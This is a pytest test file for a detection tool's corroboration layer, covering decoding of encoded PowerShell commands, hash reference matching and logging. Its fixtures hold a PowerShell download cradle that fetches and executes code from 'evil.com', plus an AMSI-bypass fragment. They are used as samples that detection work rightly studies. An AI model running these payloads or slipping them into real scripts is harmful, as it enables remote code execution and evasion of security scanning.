"""Tests for the secondary corroboration layer (Section 7).

Verifies:
1. Decoded-content inspection correctly identifies suspicious patterns in
   base64-decoded -EncodedCommand payloads.
2. Hash corroboration correctly identifies reference-list matches.
3. CRITICAL: a known-bad hash present with no qualifying behavioral signal
   produces ZERO rule_hits — only a logged CorroborationResult.
4. Corroboration is logged (standalone) even when rule engine produces no hits.
5. Corroboration with rule_hits attaches to the existing alert context.
6. Events with nothing suspicious produce an empty CorroborationResult.
"""

from __future__ import annotations

import base64
import logging
from pathlib import Path

import pytest

from normalizer.models import ProcessCreateEvent
from rules.corroboration import CorroborationResult, corroborate_event, log_corroboration
from rules.engine import RuleEngine


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _b64ps(script: str) -> str:
    """Encode a PowerShell script as UTF-16LE base64 (as PowerShell does)."""
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


def _make_proc(**kwargs) -> ProcessCreateEvent:
    defaults = {
        "event_id": 1,
        "utc_time": "2026-06-23 12:00:00.000",
        "computer": "CORR-TEST",
        "process_guid": "{corr-guid}",
        "process_id": 1000,
        "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "command_line": "powershell.exe",
        "current_directory": "C:\\",
        "user": "CORR-TEST\\User",
        "parent_process_id": 100,
        "parent_image": r"C:\Windows\explorer.exe",
        "parent_command_line": "explorer.exe",
        "integrity_level": "Medium",
        "hashes": None,
    }
    defaults.update(kwargs)
    return ProcessCreateEvent(**defaults)


# Known-bad hash used in the reference list (from corroboration.py)
_MIMIKATZ_HASH = "61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1"


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    eng = RuleEngine(Path("rules"))
    eng.load()
    return eng


# ===========================================================================
# Critical invariant: known-bad hash alone NEVER produces a rule_hit
# ===========================================================================

class TestHashNeverProducesRuleHit:

    def test_known_bad_hash_no_behavioral_signal_zero_rule_hits(self, engine: RuleEngine):
        """CRITICAL: a process whose hash matches the reference list but whose
        command line and parent are entirely benign must produce zero rule_hits.

        The rule engine must be blind to hash values — hash corroboration is
        reference-only, logged by corroborate_event(), never a detection trigger.
        """
        event = _make_proc(
            image=r"C:\Windows\System32\notepad.exe",
            command_line="notepad.exe",
            parent_image=r"C:\Windows\explorer.exe",
            hashes=f"SHA256={_MIMIKATZ_HASH}",
        )

        hits = engine.evaluate(event)
        assert len(hits) == 0, (
            f"INVARIANT VIOLATION: rule_hit produced for a hash match with no "
            f"behavioral signal. rule_ids={[h.rule_id for h in hits]}"
        )

        corr = corroborate_event(event)
        assert len(corr.hash_matches) > 0, (
            "Corroboration should have found the known-bad hash"
        )
        assert corr.has_findings

    def test_known_bad_hash_on_powershell_still_zero_rule_hits_from_hash(self, engine: RuleEngine):
        """A known-bad hash on powershell.exe with a benign command line.
        The rule engine fires based on command-line content — not the hash.
        If it fires here, it must be because of a command-line condition, not
        the hash.  This test uses a benign command line to isolate hash impact."""
        event = _make_proc(
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell.exe Get-Process",  # no suspicious flags
            parent_image=r"C:\Windows\explorer.exe",
            hashes=f"SHA256={_MIMIKATZ_HASH}",
        )

        hits = engine.evaluate(event)
        for hit in hits:
            assert "hash" not in hit.rule_id.lower(), (
                f"Rule {hit.rule_id} appears to have fired based on hash content"
            )

        corr = corroborate_event(event)
        assert len(corr.hash_matches) > 0


# ===========================================================================
# Decoded-content inspection
# ===========================================================================

class TestDecodedContentInspection:

    def test_encoded_download_cradle_detected(self):
        """A -EncodedCommand payload containing a download cradle is flagged."""
        payload = 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload")'
        encoded = _b64ps(payload)
        event = _make_proc(
            command_line=f"powershell.exe -EncodedCommand {encoded}",
        )
        corr = corroborate_event(event)
        assert corr.decoded_payload is not None
        assert any("DownloadString" in ind for ind in corr.decoded_indicators)
        assert any("IEX" in ind or "Invoke-Expression" in ind for ind in corr.decoded_indicators)

    def test_encoded_amsi_bypass_detected(self):
        """A -EncodedCommand payload containing an AMSI bypass is flagged."""
        payload = '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")'
        encoded = _b64ps(payload)
        event = _make_proc(
            command_line=f"powershell.exe -enc {encoded}",
        )
        corr = corroborate_event(event)
        assert corr.decoded_payload is not None
        assert any("AmsiUtils" in ind for ind in corr.decoded_indicators)

    def test_benign_encoded_command_no_indicators(self):
        """A benign -EncodedCommand (e.g. Get-Process) produces no indicators."""
        payload = "Get-Process | Sort-Object CPU -Descending | Select -First 10"
        encoded = _b64ps(payload)
        event = _make_proc(
            command_line=f"powershell.exe -EncodedCommand {encoded}",
        )
        corr = corroborate_event(event)
        assert corr.decoded_payload is not None
        assert len(corr.decoded_indicators) == 0
        assert not corr.has_findings

    def test_no_encoded_command_no_decoded_payload(self):
        """A plain command line produces no decoded_payload."""
        event = _make_proc(command_line="powershell.exe Get-ChildItem C:\\")
        corr = corroborate_event(event)
        assert corr.decoded_payload is None
        assert len(corr.decoded_indicators) == 0

    def test_short_form_enc_flag_decoded(self):
        """The -enc short form is also recognised."""
        payload = "Invoke-Expression $code"
        encoded = _b64ps(payload)
        event = _make_proc(command_line=f"powershell.exe -ec {encoded}")
        corr = corroborate_event(event)
        assert corr.decoded_payload is not None
        assert any("Invoke-Expression" in ind for ind in corr.decoded_indicators)


# ===========================================================================
# Hash corroboration
# ===========================================================================

class TestHashCorroboration:

    def test_known_hash_in_sha256_format_detected(self):
        """SHA256=<known_hash> format is matched."""
        event = _make_proc(hashes=f"SHA256={_MIMIKATZ_HASH}")
        corr = corroborate_event(event)
        assert "Mimikatz-2.2.0" in corr.hash_matches

    def test_known_hash_case_insensitive(self):
        """Hash matching is case-insensitive."""
        event = _make_proc(hashes=f"SHA256={_MIMIKATZ_HASH.upper()}")
        corr = corroborate_event(event)
        assert "Mimikatz-2.2.0" in corr.hash_matches

    def test_unknown_hash_no_match(self):
        """A hash not in the reference list produces no match."""
        event = _make_proc(hashes="SHA256=aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899")
        corr = corroborate_event(event)
        assert len(corr.hash_matches) == 0
        assert not corr.has_findings

    def test_no_hashes_field_no_match(self):
        """Event with hashes=None produces no hash match."""
        event = _make_proc(hashes=None)
        corr = corroborate_event(event)
        assert len(corr.hash_matches) == 0


# ===========================================================================
# Logging output
# ===========================================================================

class TestCorroborationLogging:

    def test_standalone_log_emitted_for_hash_match_without_rule_hit(self, caplog):
        """When there are no rule_hits but a hash match exists, a standalone
        corroboration log line is emitted."""
        event = _make_proc(
            image=r"C:\Windows\System32\notepad.exe",
            command_line="notepad.exe",
            hashes=f"SHA256={_MIMIKATZ_HASH}",
        )
        corr = corroborate_event(event)
        with caplog.at_level(logging.INFO, logger="rules.corroboration"):
            log_corroboration(event, [], corr)
        assert any("standalone" in rec.message.lower() for rec in caplog.records), (
            "Standalone corroboration log line must be emitted when no rule_hits present"
        )
        assert any("hash_matches" in rec.message for rec in caplog.records)

    def test_no_log_when_no_findings(self, caplog):
        """No log output when corroboration finds nothing."""
        event = _make_proc(command_line="powershell.exe Get-Process", hashes=None)
        corr = corroborate_event(event)
        with caplog.at_level(logging.INFO, logger="rules.corroboration"):
            log_corroboration(event, [], corr)
        assert len(caplog.records) == 0, "No log output expected when has_findings is False"

    def test_alongside_log_when_rule_hits_present(self, engine: RuleEngine, caplog):
        """When rule_hits exist alongside a hash match, log says 'alongside'."""
        from rules.schema import RuleHit
        from datetime import datetime, UTC

        fake_hit = RuleHit(
            rule_id="PS_ENCODED_CMD_001",
            rule_name="PowerShell Encoded Command",
            mitre_technique="T1059.001",
            mitre_tactic="Execution",
            severity="High",
            event_id=1,
            fired_at=datetime.now(tz=UTC).isoformat(),
            matched_event=None,
        )
        event = _make_proc(hashes=f"SHA256={_MIMIKATZ_HASH}")
        corr = corroborate_event(event)
        with caplog.at_level(logging.INFO, logger="rules.corroboration"):
            log_corroboration(event, [fake_hit], corr)
        assert any("alongside" in rec.message.lower() for rec in caplog.records)
